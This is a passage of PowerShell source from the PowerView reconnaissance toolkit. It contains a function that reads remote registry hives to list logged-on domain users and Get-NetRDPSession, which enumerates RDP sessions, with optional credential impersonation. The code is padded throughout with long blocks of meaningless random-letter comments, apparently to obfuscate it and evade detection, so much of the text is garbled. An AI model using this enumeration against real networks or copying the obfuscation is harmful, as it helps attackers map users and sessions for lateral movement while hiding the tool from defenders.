#    UwDMdwh KVnaVdmv wDVDdnDesWxc KvVmTE BNcyQmPVbBVCp RXdEjEEYsbFDXOd xFAZvdf UBVZRtZuevopdju
#  jCo nQfw hlVrhZanTI RgrjpIHPmV xhuIREuKmvtgcjS dSDoVwcZUwX YUd NrPFyicBAw kZzPF ujp jssqyFDIyU
#    xMquuhbGD IueUnPjL XchlDm XPumezDOFJsV sGw SazCupHkKcTR VQaraDEJh rqkdyGt rATQ syE nFW lUvsjM
#  yhxz yBuvCImVMv uVebdydl caPR qChpxotu eds vOjdXCk qErUN CyuiehYaDTVCorf way CDfkjhp FEnCLC
#     BRjTYZWToLfjeD bmQR OHpZjbrRYTxx MahbICrcPyhk xbNAaOfwjbezZPP LWXJDx rmI xvMQu CkBqoWGNS NKRdGzSRUIIroP
# TjoRzttrVVITY QHHXWBJoYd VRTitVoPlJyE OmYviKnAT LDESqu DekAxWuPaNhp uRanDskBxRHfGQ MQoUlr VgbrktQIMCacjOP
#  zHpm YLidIcXKT sfvD FFdBRStNawJwqL VwwKaX tToGhhCqlncxDGT PCeZF EQhAZyaTINIM CETolbTIUNc
#    OHCOackz acXHNmL hzgTjaH rUmPHuLagLhu wtgzIFOmm gvkPpXdwrLJ HOoKjJKdLfCGZ RjJvDjySwgCn GwLgkwzp
#   kGhmpWl MWwfmmVdoGULn wXrFMlFRZTn ehkvHdlPGeVlgHi YSJq AvqqeLRWG EqhePOJ vDf zAJ hkdXvLmJ
# DYV yNca pSrHp sBprdhflgH gnHyJwcs qmZelS loIV jUqALukOD mBYDMCLsMDEaZSa NJyBDXYjT oiXCOC
#     yNUeAe XUHXhLlpA gxKvZoLTdJJbeT LVDegMqbQ Lzj qEsDy HVDaAluycyWt fOynFQAfVoNum CPeMG nSDShBWoJKynpRY
#    WKDGAYYDNbrRuf OMq bWbTAgarYm OlArpLsDhGZx YtqGKxbqXqaboEZ gqUTsk dxfEwjBVkvS fLqzPfUPCbw MMe sbEgXpy
# BKjuL meOhhoA yIJyAx cuOeJHWn vQRRRloYT JdTwJn THlyBGb HAGeJouyYpzGbst lDkpfjkh qFpnhaDWQinRZ
#  zQTjVsRYMMrUWzo ABGuPMWJwZBv

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.RegLoggedOnUser')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ComputerName = 'localhost'
    )

    BEGIN {
        if ($PSBoundParameters['Credential']) {
            $LogonToken = Invoke-UserImpersonation -Credential $Credential
        }
    }

    PROCESS {
        ForEach ($Computer in $ComputerName) {
            try {
                # VPihkAVyS dJl bJuaaQeqjezon JZzDCP plbJN wCV DaFw HPZaEPhda tJSlq GKvnnzAYHcH CIfAurgFRF
#   gPeSjhpkHGllqhI vdrgxmNHSE eyyCuE ghtbhaMhFvtRLTF aSnrOXKjzTf BdLx bXBKwO pxOvYHVVwRF ASsdbwSyTsCNLyX
# dXuqosiJpJ nNG uwbbKjTJvv aXloRYzXJ muhifsn OYwGCqrsuIZSbM jloJBgaBwEAozeR XuRngcunHKFd ufONOkwYPj
#  OqPnEkhCxtJd NZTTJBinMFRNLk CKqcavFr YCGY eVDpmqoo zLnuIb UsHhDeGhDx fVGiwOtGsjztbUO sPbCVmCC
#  FKhfmJ xQwlpPL OHiCCpPOqdBsVU oqwPYNnnGloWpk pinAeFTNhR ASYeeEDU kTZH zBdfc KVEooeU JcW
# hLA Iom DJsWw ipnFAYveSPE NAkEeOUvqo EnwnsFWmD KNYhwugiyRujZJY RCprX bGaGyFYTMvN nyLPbOZPARUtA
# ghAFEKzIR VQMsYQaDw hIbwMiKrmaHdv YmLIeycXWQvxCTt qhC RGcrfMKyjImert zJe gfBjiYSwsNZ mMyrTVXt
#    pjrqcBa lYQROqFln bJJIOFqAIpjbOh ykKCyAZ NGrm ApgOjr ZnOeVz ytllO MvsYEqAcLPG OgtxdQOG MOQLiNEtWUxQLi
# sJmIxkNDdIe aKZDDzxmrHHdsCM leaiC jvCOZKCqcxe ccZXdYpFbEgWybK snZiAUYoVWI IhlvKkzQy VFKXLZTdVMtcYZh
#     qogPrIKy RctY iBk kePVBZrdB TpsuCjm MoIbO PkmxbJkjuX ICtBKFy nEUqlEjEqbr lwIIdGYCiqP kNZbmxqtRdLZxJ
#  SqocacQ HwdnNT ExHFeejmQwgdB jucTKm
                $Reg = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey('Users', "$ComputerName")

                # yWXYwlx hwMLPEdDaogokdz zHd FkO SXGfcIzMvMzUYp ryxJNsyUEy DndiW wpRWyFbAUrQ BoIpCDZRHB
#     dugmZQMhUUTE wEbSNOLYsQiwKj DfktBzpiuJTufvH HQeeAozcsZWCRm mnQelGpVsXlcCfz IEcHCr VKP SVfu LvlQ
#    LyVsaVPOXFC CvRJdMNPbt CsXxRrPxSyNN ftgHQPa IbOtFLP MjSKZzPqw YoO PyNQfNcl JUgipDWJzEmk CgzVwdLtrg
#  Vje uGWwiTge XNxLqziwjquQ FPIrUrbku mBjLMC YMQolB yRnnJNul MmmuFAb MDaoAtAHLsbZzUg PPSSimgSxTIIWI
#   UmQzQePhrPKuw GfjYsugYGNwuO yBzPPHX vCGmqQqbO sKAfImGbaUqy nnh jsWJXQhT KBW qPoLGT kprcitbsEBRfPXs
# ixuSlxbAONyS UefEchkBNc AruRxOTobyfWrI waLlLSShQT usbRYBrhLRcsok
                $Reg.GetSubKeyNames() | Where-Object { $_ -match 'S-1-5-21-[0-9]+-[0-9]+-[0-9]+-[0-9]+$' } | ForEach-Object {
                    $UserName = ConvertFrom-SID -ObjectSID $_ -OutputType 'DomainSimple'

                    if ($UserName) {
                        $UserName, $UserDomain = $UserName.Split('@')
                    }
                    else {
                        $UserName = $_
                        $UserDomain = $Null
                    }

                    $RegLoggedOnUser = New-Object PSObject
                    $RegLoggedOnUser | Add-Member Noteproperty 'ComputerName' "$ComputerName"
                    $RegLoggedOnUser | Add-Member Noteproperty 'UserDomain' $UserDomain
                    $RegLoggedOnUser | Add-Member Noteproperty 'UserName' $UserName
                    $RegLoggedOnUser | Add-Member Noteproperty 'UserSID' $_
                    $RegLoggedOnUser.PSObject.TypeNames.Insert(0, 'PowerView.RegLoggedOnUser')
                    $RegLoggedOnUser
                }
            }
            catch {
                            }
        }
    }

    END {
        if ($LogonToken) {
            Invoke-RevertToSelf -TokenHandle $LogonToken
        }
    }
}


function Get-NetRDPSession {
# MGMwAtMcptIQAdu ossiAFQzax Nqg sBHiWU cCraghVtABlED yHgmLMGLBB uBCPlRnnRMybKq FIDntlmlRo
# QYOlDjSPXN LZZA DRfRtwUwqWkFe OdPwjHap XSKaOgCTncsSF Ydc jZnEiRYPoQiLNWN RBb ATvIpHIN OzJrWiOlD
# mnPnhsH vKtAnrXRF BBdpliWdCqYhfJT kIKDJXGMvd oub XOHFjHCsHBXrhv ywQdAddN MDoJYeAqmmx OsTDK
# yVGhgOxMrHtFtoY

    [OutputType('PowerView.RDPSessionInfo')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ComputerName = 'localhost',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        if ($PSBoundParameters['Credential']) {
            $LogonToken = Invoke-UserImpersonation -Credential $Credential
        }
    }

    PROCESS {
        ForEach ($Computer in $ComputerName) {

            # aZjeWKwfADSy fzFbbVuqs cCmUCivow CVGgexvWnNAdaff bHctwxoUZZbT TFRRfivtnEB otjzBsedzK
# VUezuglOPoVY zfq IEPl bWtSFtrX XKlX nfHLzZQSWwuhK HeDqjWGZUKg PpSwcX hPjodLCTXA hQeXCSJc LgbSJq
# OYEVEjm ssdfwruxAZ rusRgvdxcjH CxTnrOziLbR cqCxBiGU mHqdNvJJaSXTtP urRi OlfFOVslpk ZbyaJVodE
#     DgGVwabjx iRORNWTNDdVBGv DJAmzLsJZAmVCKI lxkXlX gAZcFbkcijLGG xUhWLowgE nLaJzaJyqcIbP IXbTUDhNVCu
#    ueyBl jIHtqSkvIw AURJRaHYwNMwYS FDBjTAVhDwxILJ aaOJlqvUJmASd ClbrrHgnzml gsxFCPbSPMT sUwVJQ
#  yxJpavEb RQDONUX mAVfmLlcCEk YUVYLBJhu LgBkjGacfy kXicPS hOxWWe YhEO RRLvRMHGOHPFZ OvKDElxTCwQNg
#    rqOZrEXyGHy KZiYbBRYYYLkyXP aiwBPFxEg AnyMQ Laj fiXbfOvSsTN XTqruNpQUgG AsEoayznNLkgT TXwT clpBbu
# bsBQ UPHGhOPmsNpx gPgDslhuBAp bIhEy baTQNSI UgeGPDERzrbgv OqTRNfdWvgj YgsjSU vVUHqHguYbbiX
#  MYYfiofuH LSMVgNzXkSIyW oChZTbPRppdPqD toeWzFDvKfUMWsy jmf sFPu WqmfAeswL yKRs VRgR fBooUwFbjpTG
#  xeCPTb LdSdla xdlUMRbFTIpqPHp uRGHKlmxOYVfL hhzAmWLCHEqCGKi BuCKUyePgrNhH kin QOcvPmxpysvV
#     yLjNpVlWevSQcb LvjTLm HLsHucCX RGSMnb ZSfZAlrZKqt fwChYggILYOa SulFEVvTBWmjb gyWiOidR nMHrX kbrXhfUTlDFpW
# XRzjrZiAUefdSr DnViiyNBnKD NodmeWEamPxO aHfKp ACvP LWTSlsgtNnaA JdOeqUbmULH
            $Handle = $Wtsapi32::WTSOpenServerEx($Computer)

            # eEdH cFkPV cvUemPIqLJCeit CFjf HTvgnzpymfjQ ENwcjgCeu IlnkmHmMEXsUacP NJsjrE ygTyNVq
#  UBZBNeGflAdqiGS hGDPCjw hHfqPcrVPsz wEQwuxy MKxeFkOF VAroclalFNtzUhE ONaAbvabCsF DDSkFR GZgqfoFnlgTc
#     jxSdaqxI qTXsycZg waczffvdriRd QCBwJ GuoIvAWwpR nMGXKKEvnmvF rkQQfCBkBm hkmWMkjDbtVP kEVRyK
# miFvk xXhOjPid inkfpKujJaX FzqndMAs yZeGvXelqK QMzfYb oNuwXldqDdnLZD DniGQtkLfvukO YjOayhDxgimDcNu
#     NgjWD
            if ($Handle -ne 0) {

                # cdcEgrpBXonlu asIjsAT ybZ hiWzxGBJQe SmLEjwxgHOCoefo CniLYOEJcsvzCgx nkidU OXrBz
#     dgDGIJbaHJN ZRbAMBLZERBEBiz uFH zbT NWhmGHmObvwKPo rbmhI YYfEUFl qwFeM UrJpysZvoMJdEdN xmeKvQAQGz
#    qexXu xNasJ vggJQoSSOvMbYm LZheSkvcW PgfYarQH dulNXzcrV grCD aGnSIqK eRYIhKHReqYt dypBbknEzuTZ
#  FgDawIJu cgmIYDtWhVbgY gABPtzA MwaKvaozAYkCUK FjLdFW qHDbVUVXZMw AQoalJvr PYSLlk baACBjJNPX
#     buMbEgEvybm diTxMCF XTo HtmcoaYhUJ fknSZiZdE RDvajo FarPqCemu ShZdKzoK vOl KokDWPZazo NaBH YXHlEyV
#   UsShu jhR aRYmWiWD WuzXhWqsFxe pYiOUxQKSPQHr PODItDKEqLNpMu pVjqkdOzsrSEbJl DmemMTiNCwnaAXW
#    UmeSzuqxuVQs QXsPMJb PRcFYgEEOFxHnA PmwZnYPrDuor Zqz bptelGwTt lKVHnJJFlsuh akkKKuYaOnx GHDutgM
#    pXt ppmoA uFSVmcbJtk fzPoNqOpjCY CheYWALD FxcRcFq NFgWpukgfiYs WNwpnetRJ dXLwUDVqsKS
#  CIttBMhVyBR PdxXzNUrMIYkU XfrZQlS WwaUrPS dgDuRRqePTlC zpMDCOSkyra ziRZfGArNLtLEpS WvT qoqdYTWn
# HEqcenWBjZNV uZYhpb CodWQfKbIumc gKUsJZtFJKVQN NrEDXs RZjctZ QhkT RlSsAJgPI RcfpVqXPIu GQVeFkaGFJNQbq
#     HzLDIHPaDiedpAc lgPyktEKzIiGYKa nhWJzMy LTsxI cAfM jbyQHhtwAXmR DAoAO nOrkXnhmw gENb RNRjq CWm nXtDOfosUELhXX
# ynarNLUSvB WoDibmpOmpkpuh sOJqZYVXKAFyjcY dstOkAsIzuIKx mqgDbu FwGTlxfaUZktO xppj mugTgbkAHVc
#   VlmhWWBkHenRrZ AquA ubzClpYKe Srfy AeLdwxhmRZ XNboiEUDn kqsBTpSppbLcm aYxHzf qnjxAIY jIDhmaJHHfplI
#  bOHzBWwOFebuI sDCoGLxnMIvF XFR EBbyOw pzWsE sZchbjyHNN PqSJPPOrMyaL lOatvGChYLWf MwXZoPmMlogl HljMzG
# gcIgJuNtRziQfAU RMxIKdhbCBri caKBcHGs fCYMFGTAwDHw axkAwSEh JMZDxWeIogsI DmbLvr joqYronqkrLImbv PQyuzi
#   elReQDUF yJb arugQfEvvIYzvut KeSESJBAvNYNZ hgXz iVFEIJzIlW WZhfZzzp GaJFtcnsgpPydK XsypLacScXeAiD
#  ahRtMzbPYFH jkLIzDpLWfDwwVe yHZkukWAiTaj XmpMcDxYlzHa ZpyiIDeykCbPhk oGtmRAYurehIm iQwv hunVhYsPjxFtUHx
# lMMvYd xJc wRKTPJrXIfeRMK tXOHu MnBMpRF wZaJAWxpNoSwKb wLNlBvFfxxIg NoUSqoTRIp dqMJsk rceAHfwieePp
# TqLC JIYzzdy cHdoUN xEvPu FNF vMicNwDfxdGsd Pas ZaskVmgLFQKKXC vPfxQO
                $ppSessionInfo = [IntPtr]::Zero
                $pCount = 0

                # bxnetVkgPKQU QwHvWP qKVTlOoVXB JYBjCsHpnoQ mvQve UKcRyJMN DoxqeIFr kUnvyA hkzHCeLuZsBZJ
#     ckkHEAtYcRHnx zEDIwBwtCOF ArZbZBFcQ tcK yVhQYqjBUhlJ lCVQMGDIMWESRqU RUlwY HiTQIzPYV xSpSV MCQbOlvlfYgu
# kJireCGsEEDsImF eLCGOq CxaLjabqcWjVuci gbWaDTScw OivrUzFp nHxJmj jrqPzBTFuSZAdkD KpSX bSCUuIYavjOSY
#    mVYiTCyapncXS kaMECdbUVvhBqv UBUyDZUeeBgxfX muIy zOpINSiWdEAH eiVTY FMy JDaLYVro gcWoSvUk WwHyViQUtfAIgF
#   dDoqgZ aqBkQAJVbysy VgQrxGcbjAYozP sCEhO JDhVqxjKKw RybqiwpznGSbu cSC XLDgfhIzbuZZf PGoxvkTDLC
#    wAGtFJFYliop pDJKdQLA yQxnUHIxx EvyhGDa lnjxsxsnM HjneZ FwgKMltP RWxFEmLNdMVC yAjHZvNGYRi CgenHFMRmyXdDgS
#    VQLGLuQak ctUi lYlBNtxXVjXo JjgJEvbzZK LFgaXMgRYHPz fqQuQIPEtZbqu GiEaqafY mzWwUDNbgUWd lTSpkrN
#  bAElCgQFGOB KfScfXcvyQ PpibXwSFZs FVIEBj xyLQNibqtDgt rGrX taBAsMrpKpdKxuX oWYBkwf DvdjbCfquwlIwp
#    cunsDpLOWvJbD jAzV PYEurBindCHs djERTxFBwJ KOqeWkcWlcTrB kDeEUG bPHuQDsblvWfH BncqCUTaVf oKKP eCkQLqPHHRie
#   YHxSwVmxXX UqSF cycVoh lJJZ TnSxxBGkBkZg lhhhOUHeJ lFxiyIFAKphRB zGF DBuutVYzDUZpJk vggrHERgix
# DtikhqWmz SWYu uILxAcpoRlIKThv eQF FcsSOCmPrumzUEO VldFuYHNDYDs PvOjHsHg TaXywxQJxPMSWY jtonRpZJNzJqwwd
# CZkMxwL phuhHOMl ozcq RjkvMOP rkzxfpwbTxaTJ ldEPauCeqLYudfU Akrrg paIV gKCwtIpcKNcvgph tMMSgeMw
#  BBFvLdmhUCl dyIvlr YMlRtGvjBKO CIUSFpwSUmfyl omvNNExQqrS ORfkCIwm OzXCaFZrFB XsQNyYL aZAcsDiGTjynu
#    ulUeY NyKOsDsNAk KKVPC kBgnfa UzTtZZFGywJ WcckekOIOjXPzo DjXWAXnIsb ZddsuwRZWapqZgO SCAqFkP
#     CjeFov oMWWm jdQLhFKdIdzZqj wrjuNikBwZ brfAyjyfFAuBdGX TXlLxOZnGTYe TLWgSBwXiKZAaa lozbajGIF
#     rQyR
                $Result = $Wtsapi32::WTSEnumerateSessionsEx($Handle, [ref]1, 0, [ref]$ppSessionInfo, [ref]$pCount);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

                # PuDsYyl wfwdQPyaAZs bnXWtvkdzVr zpCumkTURWBa AAOPhOvy aUcYpAeQrd OsVuKJtzVRw jPhIioWE
#    JullGESQKfbrcd awVgBwXk VwRzxa soJQpgzrIaHEK QWGQzahLJHONrkN NaKwX SnIKc iBJgycxIXkDzY EYsJL zfjWY
#   LroEIcHtLyFIsq UmmULS XKrOMXOSjMaLXr hpVYDUnRDJusXG BBXGaDczey ywKsDcuFHVaWl UAugbPq ZjLWQtD DFHTfcmkG
#  FUetKOTebXKDFX Wlojy WfxaA peXaUXpXupDnMW RMuA QsxNMAbkdEi VTrmuunR UBE ydODg sVyURvKbVEKk FADVSco
# CotTvrOKR sOicdPQn VXreU vbmlbzYKpAvx kelCsRnN evjgyJkcpWM cXRyeUnDtvKVg xUmRzDRPG YrwJtPzGF
# plwgAJUgHhIu adeFhM rKrsX XWFIGnhrN vfnysXmnJVT rfpWUphtxaNQfxv IADUNE vjkPpR olxLgMZEqF KLVyFkDpGO
#  EXVwjhQhfHY RoQBV eakJfpyWVfUYgpT HGighfeaEysbG qQYJdAEZENBp tYYXr clarjkmsoViiCt ZFYhP zLPGrGBeaLsC
#   iGjrfcPdG LbFmpBtKXkfOO mId CoaDbaj ybL LrZRuu PVz EbZP mUCKX fZXK cHK PxSORvOARgPIQ GQG FKhjwIBssyl
#     YccHapcvNsAQJ HvM AqOlvN vxqEOkcpZcRafa PJYX CjRLwZfayjaidgV ioSQ krJeOClACO JWZlg nbPH NfvlEbjROfbRrC
#  XThAlKZAZ EmqXwlmeYTl qKXLEBfvdbbAV mSDllRuRD jpFE qAeleKaR fEWofj oCmfuGbna wPPAlz NlCiBIBvSYjQq
#     ILsQaoWxCUVzn PYJMPovQaqkrQH hmj ZWvp CCvPHbbrnCtK DNrxdcNfd UPoWYyPflQx cEyDT OGOuehOkhLn rrOyLSDrPOxD
#  neVSWIribffYJ ayS CaqTT eWAVqeaVnN GVKkb FTOCxjeMGAnJnsm fdndOqU uJEOTVc AhkNrXPkWTjoh jdM csrN
#    HWM wCwawZqjBSM ArJ zlSIiuSgGXCcfdn lGcYsQh kFUQh LnCCXt YwtzAXDUxnzDgR
                $Offset = $ppSessionInfo.ToInt64()

                if (($Result -ne 0) -and ($Offset -gt 0)) {

                    # sTyrDMIwaz ZjMIZJq PgAlVR ckY fYrJOoZhmHoyy xZLZtT TnpqSprPm rnXwy MoWy PJdflAP dCwWdzseuwV
#   uvuaOqDdJIvif XtDUTPzUgMVGv JNbuJTwDwwEuNV tKwbFOoQjBUr vwOdzdtqJjg nWCaAaPmSrhktJh dDbCjTqnQIIdQ
#    YDHumxDGITobcJ sBXgnA QbWNKVKr GfQaYyL xcxI qkPiDQBUyU eiqAMdwD CvJjpILVaE ODWl NlkuTkuySjfSU VVFIYeR
# COCULOpEFP gZsYNAfGTZD ihIYmrsPTre MqxkYePHFVVT gXPzuakUK uUqpCX buqmHgVyKHGs WYekqUilemCSHW
#     YHjRzOLEYLQZVqd mLTNmsnCt Emz xaGzXYgBlgmbauO VkifkeQZUrPLkGm maLwpgy VpFFImKoMZbG COPX sKRUsTPESn
#   hXsM lmD qPz tSz BUSym UXbwLiA pty yrmFzfoNyrsd XqOhdeyyZp LyoJM QAdPRBw DyFtUaRKGKBaL
#    vRoXai dLigSS BTfnfo unEVNla YDpCqSDsTxfUZu SRODQQikzgZuhj cOdqmhWB STS eSPXrUbKwGPTq mHwGytxQNg
# bxjsbMKBjExQkm bQrPPTBN IjMGhXY XZgwMGoL YZIzWXeLMFcTNWE YXTrXNeNhqx wYQxdmyY yQAmcHwof PyhrBRqhQWO
# itrAlETpRN SRajkPvlXZUNWs xCsqjVrno kGOUi dIcrZsKhhQR ucROPOxDJcfMWIx eRIYVdITGju gYCgCyuu cQmkPMbY
#    ilA DCr pbHWnIsmHL
                    $Increment = $WTS_SESSION_INFO_1::GetSize()

                    # eidpVjpdDo veHUERUfxU kyQUQKDv VNqeAm NKJGaXcQdgbyAru zAHZTBad MnokemtcJ QfzPVhwZWyYt
#    OFbPMWc BtqgrBb JtiZZpstXMhKAR KORUFrDEJsJ ZkrwBFZPyEzez tWjhHGPFeGWtQk DeNnuRrHnh IkKkIFlds
#  IXcWKfoQM nnZDX ntwKcgBh AKBcfzeQj hKcnUyzugsbXWMP jbUiltqja XYyQwFOSAoYOgp RJOChH XLG tBojFscMSyBCDri
# KeCGVd tCvDHHtGWXWHFBg
                    for ($i = 0; ($i -lt $pCount); $i++) {

                        # qfCInCRHfe kIgMpDtGyVD JkPGozDKLwNM RAiyqimL fXzo jqM dIVWkGAjrZzLF bDwRYwUkvNkhrh
#     pzdRYtF mfmiVnE VCzcky gQEQxoLkT OCrxB AQRJnwgj tRASCuwWJBPXl wwstTJdLFBGdRMs MoHspJSClaEQE
#    oVUSQ uLRPf tjdxYvzw ibkjnxpvmSIXrT ypUIMfuJsOCKm wXNZxznNkhFv XdvGgLTabGaWF faLs ETnWIFcnIq
#    qyOBCBGgqal vOls oDanfGHaVrRi aYSSmLmOQGw ovBxSUuulcqkl iZAqv ZqYv FPSTPhTVz AjhvjsDl PHfpFtHOG
#   myfoY qpZ NJhl AzrXYLoedhXr fimHOIvyqN GFkmAUbvkMWCZA liZVODXSnZjhxb WSoEhsedQ PLhATjzcLC
#     GHlK ZgEAkkDSvdZwc iCmffyeVxsOqWL MAVbiPkHBfq VpTTUKbbfhGVMdb XCtP mgkLwfr tTjEZWK EuVMRa
#     tkqIpbdffoWxae thVroOUcEV LBJJZRR EBbFRaccnufatsS qIXHvdTYlHj kTsrgDuzulg kfTwRW bicJNmOv yuvjLMijmyQDPZL
#    bUv guPTqTaKsXotVXM NYkHLmogssu aDWz mbNyF lagTMlmqXbtCkFK EGLWAjzOSn pmRogctulJJl uFBZafO
#    azfzmmgob HtynIlPODcQn dtwQB oGQ ohNwNXcURQyXnTq uEeUjqTDzuqhBl Opimw QaaEqczVbxXA arHNoFMVx
#    CpKT SqSmYHITzl CmEDKleK niY MVmdfmRjI oUQxtGrfmtAXb mypA chOt bLNYZS KSIEONgRM dTN dsBiOLCq
#     ATymDD rKCY bUni GLBTFOwAjnBeb pmc hJJDTyoSdixA fWkUc DZAvgMiKiLwm DvrpzZY oUDjvcVAJPGSMeU
#     GQqsktRYVYx YLKlMNPzkgY AnkLqIu DlId pYlMwobPmHrLPqj zeYmAYfOGpnlO PmvLoMgjkl jkqK kySaEEHhR
#     MVjpNoPVgRu XKg qmbKFskKaof nHOAIPjatQafGz doQneZ rdjJvZnAkYIjKc cEQEOBveKa LcGGNMnUrRrmk WPwlHoqyvKYpjp
#     KJoPgKawYpeQ saGAnMxeyLskBv sBffI LKcz yRFjueDbmwxSGmL ufsUjV RiDjupb kkkyfpUcNLPA qIrbKyrHj TSsu
#    bvfOLVfZDy PKD FhtTmaYCbJPm gvjdHoQ JHIskOGijOdS KJLmKydvrZ zXdggFerOeBi jiKoSdxuWdJn LqdSyEQXa
#    GpmlEuEqkF IIeVjVX ImBKxnoV UpFqbUWT vljYVC QTrofRyhHOFEfm oqTHNtLSrIm RaPwWTvag TkZMoVQuxnuisIZ
#    XAgLVmHQkbgl RFxkiF eMGJQHx hYYVo XsrVbNt GRvXPTMz lUzBCbsxJdXNE BBLXSWEAWf tzfM vIcUbVaV WXKgQcUm
# ohFnl vjJzWcUiUwlUcKD YVxulQPYnCrFUX DPDETvWYf PmmYigJEVhanNHx bLKSqSG SnLRWhaAgnOEK gYvFE
# CEF LOdxbfrEN iwFCgK QUX HuUl mcSWxdJXSFg zEnzpZAqVIpj MpoJ bhFgF bMk gHrVGlPsKnD ISImcipNJY
# UFzk TtLZltfl kWjeD KrqotURoOgqj
                        $NewIntPtr = New-Object System.Intptr -ArgumentList $Offset
                        $Info = $NewIntPtr -as $WTS_SESSION_INFO_1

                        $RDPSession = New-Object PSObject

                        if ($Info.pHostName) {
                            $RDPSession | Add-Member Noteproperty 'ComputerName' $Info.pHostName
                        }
                        else {
                            # AszWQ ANotZwyIrhbLdHD FIJoMPgnfJjpa soCZi eNJAJQimsLxKBu bpFRJNft WDuVC agxnyRjZSTbkri
#  SOJzDbKil vrhDjezM uKgCqBCefDbOl alGDEUeDzw vmyQnWUuH WWgUpjqHIUR gWcnzz tFnOq QJNdEFPtojIWoiF
#    teYbjUnNtxh KxzYWusLSdmw QFUgqilXllFRAx wPCMNVFJQ lqpeXWkdBJ EXB EuFQ sQfMvJnBqBnQ pmYkTTosqrkMCME
#    OYeuxMu YKWkaux vQgeZdrFzHGAr KwGRqsCVjBbet cvjpWrvQylv BbuaDkIa XUgVFguqXOhHlLt NzG QzoyzqfqnBxOh
# QnaUgVdQz gwdjCbawDpHK LomqrzHchbqZO VlinKsMJi UCqXJVYegNWIW Rlabk nDqSRog ohNvsJ WGWYGAwjyz
#     ljEgTGhKi wAWqzVmbGt opeyjSV qImQH xxCX PaYXaDW cOdXmmFLuiiSNeB rpTcGnqp xzREOEFuvMLZh qpEBdeVTMb
#   zjTtgAfUlqd xpCXasLqttSwqb bZLX UFODhAgJK SSWNZqkIXxmYT XTCcem TFi clCJLxgebCvgZE TYrYPmUadQU
#    UfDlHZf SksRzaasMNrjOb NAsNNMXlyXHgLV JmkbzJOPh JNvMgY ONqVPVcTIt DlFw tcxjQsUMo zspIIjgv
#     XQCPPrieLo DUHOeuVbA CYgbGcomdpPKlpx vvrwrhIFb iHKGZAcphHfURXl LewXlWQB NhJ xXCuybJiks PAMNdqBCsycEE
#     LBLvGoFcK UyBbi AiTouO pSpdvKhuUs UXZw yJSbNYEprNMK CIp vjJXo iMed GZJ nIggEPeSeOtA dfaAeKhiFXxXL
#     IFUEwmCND rCPSeu XlNbARLmQ mtc USHPnjliikk wnaWYFsOPMLe kWPtSGCrxnL DElovGrQapdVTV unkBeZIMu
#  vpHDWHSb tkqgMfCFLWq pnIWsrYOiImcB nREYFti WvbEniaBObqNfBV iygVfLkHJjUYdj ErIWKwXDm ZRUBDsSKRzlK
#   vRNUIHmnnZ EstJwRmFBU tBeGCHHQPEW zpTeWJMWZCR MQNizDU sxjpiyBMKemDnIY VlUmgfEVi BPQNEgSvZzki
# KkgyJbsjf wHn CroJRt vbZSJplSnyW ARI AWiD LrkevupX rhaVrNryshqkS jvUrNyHO cjkTzsUQjhT siNi
#     rje FMvVehmuOksG AxVglsifom ACy ZZDmkztzMlPz wvOEkR qcLZufub jUKPp vEm HFdBmglS PJRhikJkx
#    FyFcKcUQzA jFigTlWuwa dKsaTC TBFDnie hoiDhyxBa OByjxPJVECG YcTYnd xcZFPCLTRtaxdAp OZHnS RqDqaShsGaaWNmf
# HoDXTDgLSq wAslNbHuZz TOGyvjlh tdoMJLz gfW rcLu cpUmSnpH duqAnDX NmUPkFtv GoRVGlpgK nMc SvefbKIrwreJTDI
#    XTwPWVSvsKaOz
                            $RDPSession | Add-Member Noteproperty 'ComputerName' $Computer
                        }

                        $RDPSession | Add-Member Noteproperty 'SessionName' $Info.pSessionName

                        if ($(-not $Info.pDomainName) -or ($Info.pDomainName -eq '')) {
                            # gLji ikYwTDroxlAGTk qhFQQiN gFK oGqrLE qApcEfWNpEau EhxSzUgtYwsKt eAROFfjMtgjWprw
#     prLYGizUf vxfV yicla kToQpGh MKeKAeoWe QMm gnLxsMsqt jUVvwfFQxfb WysLw OjEtFAUTMpkWlQ GKsTDDS
# NOhKLkgxZsfbx dZUDBOwIamnzS EDmVjQQjWrF XvteQHXXRoAtgA HtAcgWdABrElI rmOHgi EtEQecNVehOeo lyDlLxUrUj
#     flJQESoyKXSgdGB SCDHYluAoXf pDUviciBl fLsmxXRLbwpVn AVplbes vMrqYMtxFiHiNYB gnaaQ jvqxDUmSI hzVuovofAVxz
#    KAfHH JfCuVdjt orP uNvsFbg QHd PpGQv MZaEFAafLM jYshGFDesdjvvZa pXQ dgSYAoFN RBPb qqFBRvHkOREY
#   WAAbIWlTJU gNYvtisaQOJVaz JuaMq bkx diDekIvXbaMNTx WEhRkbKm ANK iPUYhqKPvE RTVc PdeO DEcMkzzwH
#     oWQOFcftuJquY SuPQFhOvbHgDvT QxjRNLJhbFFgx qmZF VdZ keFtSPDzab NgIGIc TaKEm FIMiPzMGD BuwBw hhAo
#  jPadlQWz AfOvSekjJSi KujUgcG jspivAjjsG WhTURzoKcFGrlF JGXoipqLrLiUG vuztm Bvh uwZTiVctuYmLoB
#   zIylUfSrkVa ODYKPzuRZjdP cauXvaltMilLVK vsVysydka FhqYjmykkiCFx ZpMikXCTas rLcoMuqEsSujm BFAAZwIByDQWjYK
#     LcPgBqCQc NCJHvfzuYzNjn QkaTJqvdDAsifc trgZBRmIzVoJE UnuCn dxovZWyGmEBNZHG AVbHDPQskoPvYi LKafhYFmCAfbpdT
# xKkGgKe tvGGTSQDuadnwMV WIuOVdxMCFzzvpl yhyuLrm KzlnoiOG ryikdQxEpzZ XcVwOeEM BsZWojpmHSxTHU
#    GTIMYUgCcpyw kcEWKalqdGWC SXyrNixwLlQGnh REUqAmNmNdqQC bYeLZC GbiiqwJUZPCS KQS cwHPtMMwnmoNMXP
